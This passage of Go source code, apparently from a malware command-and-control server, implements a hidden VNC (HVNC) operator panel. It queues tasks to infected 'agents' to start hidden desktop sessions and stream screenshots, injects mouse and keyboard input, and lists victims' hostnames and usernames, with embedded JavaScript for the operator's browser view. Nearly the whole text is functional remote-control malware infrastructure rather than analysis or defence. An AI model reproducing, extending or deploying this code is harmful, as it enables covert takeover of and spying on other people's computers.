    sendWebSocketMessage(message) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            message.timestamp = new Date().toISOString();
            this.ws.send(JSON.stringify(message));
        } else {
            console.error('WebSocket not connected');
            this.showError('Connection lost. Please refresh the page.');
        }
    }
    
    showError(message) {
        console.error('HVNC Error:', message);
        // Could implement a toast notification system here
        alert('HVNC Error: ' + message);
    }
}

function sendKeyboard(keys) {
    if (window.hvnc && window.hvnc.sessionActive) {
        window.hvnc.sendWebSocketMessage({
            type: 'keyboard_event',
            agent_id: window.hvnc.currentAgent,
            data: {
                keys: keys
            }
        });
    }
}

// Initialize HVNC controller when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.hvnc = new HVNCController();
});
`
		w.Header().Set("Content-Type", "application/javascript")
		w.Write([]byte(js))
		return
	}

	http.NotFound(w, r)
}

// WebSocket handler for HVNC communication
func (c2 *C2Server) handleHVNCWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	log.Printf("HVNC WebSocket client connected from %s", r.RemoteAddr)

	// Send initial agents list
	c2.sendAgentsList(conn)

	for {
		var message WSMessage
		err := conn.ReadJSON(&message)
		if err != nil {
			log.Printf("WebSocket read error: %v", err)
			break
		}

		c2.handleHVNCWebSocketMessage(conn, &message)
	}
}

// Handle HVNC WebSocket messages
func (c2 *C2Server) handleHVNCWebSocketMessage(conn *websocket.Conn, message *WSMessage) {
	switch message.Type {
	case "start_session":
		c2.startHVNCSession(conn, message.AgentID)
	case "stop_session":
		c2.stopHVNCSession(conn, message.AgentID)
	case "take_screenshot":
		c2.requestHVNCScreenshot(message.AgentID)
	case "mouse_event":
		c2.sendHVNCMouseEvent(message.AgentID, message.Data)
	case "keyboard_event":
		c2.sendHVNCKeyboardEvent(message.AgentID, message.Data)
	}
}

// Start HVNC session
func (c2 *C2Server) startHVNCSession(conn *websocket.Conn, agentID string) {
	if agentID == "" {
		c2.sendWSError(conn, "Agent ID is required")
		return
	}

	// Check if agent exists
	c2.mutex.RLock()
	_, exists := c2.agents[agentID]
	c2.mutex.RUnlock()

	if !exists {
		c2.sendWSError(conn, "Agent not found")
		return
	}

	// Create HVNC session
	hvncMutex.Lock()
	session, exists := hvncSessions[agentID]
	if !exists {
		session = &HVNCSession{
			AgentID:     agentID,
			Active:      false,
			Connections: make(map[*websocket.Conn]bool),
		}
		hvncSessions[agentID] = session
	}
	session.Connections[conn] = true
	hvncMutex.Unlock()

	// Send start HVNC task to agent
	task := &config.Task{
		ID:      config.GenerateID(),
		Type:    config.TASK_HVNC_START,
		AgentID: agentID,
		HVNCSession: &config.HVNCSession{
			SessionID: config.GenerateID(),
			Active:    true,
		},
	}

	c2.mutex.Lock()
	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)
	c2.mutex.Unlock()

	log.Printf("Started HVNC session for agent %s", agentID)

	// Update session status
	session.Active = true
	c2.broadcastSessionStatus(agentID)

	// Start automatic screenshot streaming
	go c2.startHVNCScreenshotStream(agentID)
}

// Start automatic screenshot streaming for HVNC session
func (c2 *C2Server) startHVNCScreenshotStream(agentID string) {
	log.Printf("Starting HVNC screenshot stream for agent %s", agentID)

	// Wait a moment for the HVNC session to initialize
	time.Sleep(3 * time.Second)

	// Take initial screenshot
	c2.requestHVNCScreenshot(agentID)

	// Set up periodic screenshots with adaptive interval
	baseInterval := 500 * time.Millisecond // Changed from 1500ms to 500ms for faster streaming
	maxInterval := 5 * time.Second
	currentInterval := baseInterval
	consecutiveFailures := 0
	lastSuccessTime := time.Now()

	ticker := time.NewTicker(currentInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Check if session is still active
			hvncMutex.RLock()
			session, exists := hvncSessions[agentID]
			if !exists || !session.Active || len(session.Connections) == 0 {
				hvncMutex.RUnlock()
				log.Printf("Stopping screenshot stream for agent %s - session inactive or no connections", agentID)
				return
			}

			// Check agent status
			c2.mutex.RLock()
			agent, agentExists := c2.agents[agentID]
			c2.mutex.RUnlock()

			if !agentExists {
				hvncMutex.RUnlock()
				log.Printf("Stopping screenshot stream for agent %s - agent not found", agentID)
				return
			}

			// Check if agent is responsive (last seen within 30 seconds)
			if time.Since(agent.LastSeen) > 30*time.Second {
				consecutiveFailures++
				log.Printf("Agent %s appears unresponsive (last seen: %v), failures: %d",
					agentID, agent.LastSeen, consecutiveFailures)

				if consecutiveFailures > 10 {
					hvncMutex.RUnlock()
					log.Printf("Stopping screenshot stream for agent %s - too many failures", agentID)
					// Mark session as inactive
					session.Active = false
					c2.broadcastSessionStatus(agentID)
					return
				}

				// Increase interval on failures
				currentInterval = time.Duration(float64(currentInterval) * 1.5)
				if currentInterval > maxInterval {
					currentInterval = maxInterval
				}
				ticker.Reset(currentInterval)
				hvncMutex.RUnlock()
				continue
			}

			// Check if we received frames recently
			if time.Since(session.LastFrame) > 10*time.Second && !session.LastFrame.IsZero() {
				consecutiveFailures++
				log.Printf("No recent frames from agent %s (last frame: %v), failures: %d",
					agentID, session.LastFrame, consecutiveFailures)
			} else {
				// Reset failure count on success
				if consecutiveFailures > 0 {
					log.Printf("Agent %s recovered, resetting failure count", agentID)
					consecutiveFailures = 0
					currentInterval = baseInterval
					ticker.Reset(currentInterval)
					lastSuccessTime = time.Now()
				}
			}

			hvncMutex.RUnlock()

			// Request screenshot with backoff
			if consecutiveFailures < 5 {
				c2.requestHVNCScreenshot(agentID)
			} else {
				// Reduce frequency for failing agents
				if time.Since(lastSuccessTime) > time.Duration(consecutiveFailures)*time.Second {
					log.Printf("Attempting recovery screenshot for agent %s", agentID)
					c2.requestHVNCScreenshot(agentID)
					lastSuccessTime = time.Now()
				}
			}
		}
	}
}

// Stop HVNC session
func (c2 *C2Server) stopHVNCSession(conn *websocket.Conn, agentID string) {
	hvncMutex.Lock()
	session, exists := hvncSessions[agentID]
	if exists {
		delete(session.Connections, conn)
		session.Active = false
	}
	hvncMutex.Unlock()

	if !exists {
		return
	}

	// Send stop HVNC task to agent
	task := &config.Task{
		ID:      config.GenerateID(),
		Type:    config.TASK_HVNC_STOP,
		AgentID: agentID,
	}

	c2.mutex.Lock()
	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)
	c2.mutex.Unlock()

	log.Printf("Stopped HVNC session for agent %s", agentID)
	c2.broadcastSessionStatus(agentID)
}

// Request HVNC screenshot
func (c2 *C2Server) requestHVNCScreenshot(agentID string) {
	task := &config.Task{
		ID:      config.GenerateID(),
		Type:    config.TASK_HVNC_SCREENSHOT,
		AgentID: agentID,
	}

	c2.mutex.Lock()
	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)
	c2.mutex.Unlock()
}

// Send HVNC mouse event
func (c2 *C2Server) sendHVNCMouseEvent(agentID string, data interface{}) {
	// Convert data to HVNCMouseEvent
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		log.Printf("Invalid mouse event data format")
		return
	}

	mouseEvent := &config.HVNCMouseEvent{}
	if x, ok := dataMap["x"].(float64); ok {
		mouseEvent.X = int(x)
	}
	if y, ok := dataMap["y"].(float64); ok {
		mouseEvent.Y = int(y)
	}
	if action, ok := dataMap["action"].(string); ok {
		mouseEvent.Action = action
	}
	if button, ok := dataMap["button"].(string); ok {
		mouseEvent.Button = button
	}

	task := &config.Task{
		ID:        config.GenerateID(),
		Type:      config.TASK_HVNC_MOUSE,
		AgentID:   agentID,
		HVNCMouse: mouseEvent,
	}

	c2.mutex.Lock()
	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)
	c2.mutex.Unlock()
}

// Send HVNC keyboard event
func (c2 *C2Server) sendHVNCKeyboardEvent(agentID string, data interface{}) {
	// Convert data to HVNCKeyboardEvent
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		log.Printf("Invalid keyboard event data format")
		return
	}

	keyboardEvent := &config.HVNCKeyboardEvent{}
	if key, ok := dataMap["key"].(string); ok {
		keyboardEvent.Key = key
		keyboardEvent.Action = "press"
	}
	if action, ok := dataMap["action"].(string); ok {
		keyboardEvent.Action = action
	}
	if text, ok := dataMap["text"].(string); ok {
		keyboardEvent.Text = text
		keyboardEvent.Action = "type"
	}
	if keys, ok := dataMap["keys"].(string); ok {
		keyboardEvent.Key = keys
		keyboardEvent.Action = "press"
	}

	task := &config.Task{
		ID:           config.GenerateID(),
		Type:         config.TASK_HVNC_KEYBOARD,
		AgentID:      agentID,
		HVNCKeyboard: keyboardEvent,
	}

	c2.mutex.Lock()
	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)
	c2.mutex.Unlock()
}

// Send agents list via WebSocket
func (c2 *C2Server) sendAgentsList(conn *websocket.Conn) {
	c2.mutex.RLock()
	var agents []map[string]interface{}
	for _, agent := range c2.agents {
		agents = append(agents, map[string]interface{}{
			"id":        agent.ID,
			"hostname":  agent.Hostname,
			"username":  agent.Username,
			"os":        agent.OS,
			"last_seen": agent.LastSeen,
		})
	}
	c2.mutex.RUnlock()

	message := WSMessage{
		Type:      "agents_list",
		Data:      agents,
		Timestamp: time.Now(),
	}

	conn.WriteJSON(message)
}

// Broadcast session status to all connected clients
func (c2 *C2Server) broadcastSessionStatus(agentID string) {
	hvncMutex.RLock()
	session, exists := hvncSessions[agentID]
	if !exists {
		hvncMutex.RUnlock()
		return
	}

	message := WSMessage{
		Type:      "session_status",
		AgentID:   agentID,
		Data:      map[string]interface{}{"active": session.Active},
		Timestamp: time.Now(),
	}

	for conn := range session.Connections {
		conn.WriteJSON(message)
	}
	hvncMutex.RUnlock()
}

// Send WebSocket error
func (c2 *C2Server) sendWSError(conn *websocket.Conn, errorMsg string) {
	message := WSMessage{
		Type:      "error",
		Data:      errorMsg,
		Timestamp: time.Now(),
	}
	conn.WriteJSON(message)
}

// Handle HVNC agent list API
func (c2 *C2Server) handleHVNCAgentList(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	c2.mutex.RLock()
	var agents []map[string]interface{}
	for _, agent := range c2.agents {
		agents = append(agents, map[string]interface{}{
			"id":        agent.ID,
			"hostname":  agent.Hostname,
			"username":  agent.Username,
			"os":        agent.OS,
			"last_seen": agent.LastSeen,
		})
	}
	c2.mutex.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

// Broadcast HVNC frame to connected clients
func (c2 *C2Server) BroadcastHVNCFrame(agentID string, frameData string) {
	hvncMutex.RLock()
	session, exists := hvncSessions[agentID]
	if !exists {
		hvncMutex.RUnlock()
		return
	}

	message := WSMessage{
		Type:      "desktop_frame",
		AgentID:   agentID,
		Data:      frameData,
		Timestamp: time.Now(),
	}

	session.LastFrame = time.Now()

	for conn := range session.Connections {
		if err := conn.WriteJSON(message); err != nil {
			log.Printf("Failed to send frame to WebSocket client: %v", err)
			delete(session.Connections, conn)
			conn.Close()
		}
	}
	hvncMutex.RUnlock()
}
